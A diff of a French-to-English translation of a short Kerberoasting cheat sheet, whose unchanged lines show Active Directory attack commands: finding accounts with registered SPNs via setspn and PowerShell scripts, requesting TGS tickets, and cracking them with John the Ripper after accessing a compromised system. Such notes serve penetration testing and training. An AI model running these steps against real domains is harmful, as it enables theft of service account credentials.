@@ -1,6 +1,6 @@
 # Kerberoasting
 
-Permet à un utilisateur de demander un ticket de service pour n'importe quel service avec un SPN enregistré, puis d'utiliser ce ticket pour déchiffrer le mot de passe du service. **Si le service a un SPN enregistré, il peut être Kerberoastable**
+Allows a user to request a service ticket for any service with a registered SPN, then use that ticket to crack the service password. **If the service has a registered SPN, it can be Kerberoastable.**
 
 **Impacket**
 
@@ -27,7 +27,7 @@ john --session=Kerberoasting output.csv
 
 ---
 
-Acceder au system compromis et chercher les SPN vulnerables
+Access the compromised system and search for vulnerable SPNs
 
 ```c
 . .\Find-PotentiallyCrackableAccounts.ps1
@@ -39,7 +39,7 @@ Find-PotentiallyCrackableAccounts
 setspn.exe -Q */*
 ```
 
-Demander un ticket pour le TGS
+Request a TGS ticket
 
 ```c
 . .\Get-TGSCipher.ps1
